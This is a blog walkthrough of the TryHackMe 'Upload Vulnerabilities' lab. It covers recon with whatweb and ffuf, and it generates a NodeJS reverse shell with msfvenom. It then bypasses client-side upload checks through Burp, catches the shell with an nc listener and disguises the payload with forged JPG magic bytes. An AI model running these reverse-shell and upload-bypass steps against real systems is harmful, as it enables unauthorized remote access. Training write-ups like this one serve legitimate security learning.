## THM Upload Vulnerabilities

# Basic Information

| #   |     |
| :-- | :-- |
|Type    | THM Room Challenge
|Organized  by | [TryHackMe](https://tryhackme.com/)
|Name    | **THM / Upload Vulnerabilities**
|URLs    | https://tryhackme.com/room/uploadvulns
|Author  | **Asentinn** / Okabe Rintaro
|       | https://ctftime.org/team/152207

%%[patreon-btn]

> 🔔 `CyberEthical.Me` is maintained purely from your donations - consider one-time sponsoring with the [Sponsor](/sponsor) button or 🎁 [become a Patron](https://www.patreon.com/cyberethicalme) which also gives you some bonus perks.  
Join our [Discord Server](https://discord.com/invite/5MjU4Cxf3R)!

***
# Contents
* [Basic Information](#basic-information)
* [Recon](#recon)
* [Fuzzing](#fuzzing)
* [Additional readings](#additional-readings)
***

# Recon

I'm pulling the provided wordlist for the challenge.

![2021-08-08-15-34-20.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629025720258/mPy7Gpptf.png)

![2021-08-08-15-36-29.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629025732220/npSk6848D.png)

I'm already having the `/etc/hosts` entry for `jewel.uploadvulns.thm` so I'm accessing the page in browser.

> If do not, add the entry with room IP
> ```
> $ sudo nano /etc/hosts
> 
> {IP} jewel.uploadvulns.thm
> ```

![2021-08-08-15-37-52.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629025740422/vSV71JHoV.png)

Running `whatweb`

```
$ whatweb jewel.uploadvulns.thm
```
![2021-08-08-15-39-04.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629025750745/FTOHrT8_N.png)

We are dealing with the `Node.JS Express` backend. In the source of the page, there is a reference to the `upload.js` script file.

![2021-08-08-15-41-45.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629025759300/vVdq_4LIcC.png)

Client-side validation can be easily worked around by passing the traffic through a Burp proxy and cutting the script import before it is rendered. In a real case scenario, backend validation should be at least as restrictive as client one, so it is good we can note down what files are supposed to be allowed or denied.

But first discover directories on the website

```txt
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://jewel.uploadvulns.thm/FUZZ 
```

![2021-08-08-22-06-04.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629025774408/RvTlk_Znaj.png)

[Back to top](#contents) ⤴

## Client-side file upload restrictions

Let's try right away the NodeJS web shell

```
$ msfvenom -p nodejs/shell_reverse_tcp LHOST=tun0 LPORT=4455 -o shell.js
```

![2021-08-08-15-58-56.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629025783766/IccsnWsBE.png)

## MiM attack with request modification

We can sniff the upload request being made via Burp on a legit file.

![2021-08-08-22-02-15.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629025795017/OkTYYJ-Y9.png)

Content is base64 encoded - so let's encode the `shell.js` file content and paste into Repeater - send it and voilà - we have the reverse shell file on the website.

![2021-08-08-22-00-55.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629025807581/5zr4yGvib.png)

[Back to top](#contents) ⤴

# Fuzzing

We can see that existing backgrounds are named using free letter filename like `ABH.jpg` or `AVK.jpg`. Now, we can make assumption that any file that passes the upload are placed together with these backgrounds with name conforming to that rules.

> On the main page we can read *Upload it here and we'll add it to the slides!*

Fuzzing the `content` directory, we can see multiple files, and a few that have ~800 bytes - these are our payloads.

> There are multiple files uploaded because I was trying different uploads before I found the right one. See the [Bonus content](#bonus-hiding-malicious-code-behind-jpg-signature)

```
$ ffuf -w UploadVulnsWordlist.txt:FUZZ -u http://jewel.uploadvulns.thm/content/FUZZ -e .jpg
```

![2021-08-08-21-41-14.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629025822041/L3trZYTyk.png)

> Other files with 800 and 799 bytes size are my previous attempts.

```
$ curl http://jewel.uploadvulns.thm/content/HRH.jpg
```

![2021-08-08-21-40-42.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629025835057/esyOpliap.png)

When you try accessing the shell directly

![2021-08-08-22-07-39.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629025846800/puYxuAIR0.png)

But during the directory fuzzing we have discovered the `admin` directory.

[Back to top](#contents) ⤴

## `/admin`

![2021-08-08-17-19-15.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629025946263/mRynBvBqOp.png)

Can we access the file via this form? 

![2021-08-08-21-42-32.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629025957871/GNAHY2wVZ.png)

Before making a request, start the listener with `nc -lvnp {PORT}` and submit the form on `/admin`.

![2021-08-08-21-42-19.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629025970867/Miw2bwR-D.png)

Yes, indeed.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629096019249/jH7ipAKXB.png)

> Do you like what you see? Join the [Hashnode.com](https://blog.cyberethical.me/join) now and start publishing. Things that are awesome:

>✔ Automatic GitHub Backup

>✔ Write in Markdown

>✔ Free domain mapping

>✔ CDN hosted images

>✔ Free built-in newsletter service

>✔ Built-in blog monetizing through the Sponsor feature

> By using my link, you can help me unlock the ambassador role, which cost you nothing and gives me some additional features to support my content creation mojo.

[Back to top](#contents) ⤴

# Additional readings

> 📌 Follow the `#CyberEthical` hashtag on the social media

> 🎁 Become a Patron and [gain additional benefits](https://www.patreon.com/cyberethicalme)

> 👉 Instagram: [@cyber.ethical.me](https://www.instagram.com/cyber.ethical.me/)

> 👉 LinkedIn: [Kamil Gierach-Pacanek](https://www.linkedin.com/in/kamilpacanek)

> 👉 Twitter: [@cyberethical_me](https://twitter.com/cyberethical_me)

> 👉 Facebook: [@CyberEthicalMe](https://facebook.com/CyberEthicalMe)


## Bonus: hiding malicious code behind JPG signature

Forging a JPG/JPEG file requires a file to start with _magic number_ `FF D8 FF`.

![2021-08-08-15-45-40.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629025999955/gkf6wjGND.png)

1. Edit payload: prepend `AAA` at the beginning of the file

2. Edit the payload in `hexedit` replacing first octets with `FF D8 FF`.

Before:

![2021-08-08-21-56-06.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629026010299/-rNo_5Roi.png)
![2021-08-08-21-56-48.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629026017976/lH6lGS0jd.png)

After:

![2021-08-08-21-59-21.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629026028932/278nMuUIM.png)
![2021-08-08-21-57-30.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629026037512/t4KNGMQ6d.png)

![2021-08-08-16-39-33.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1629026049401/npMd99XAy.png)

[Back to top](#contents) ⤴

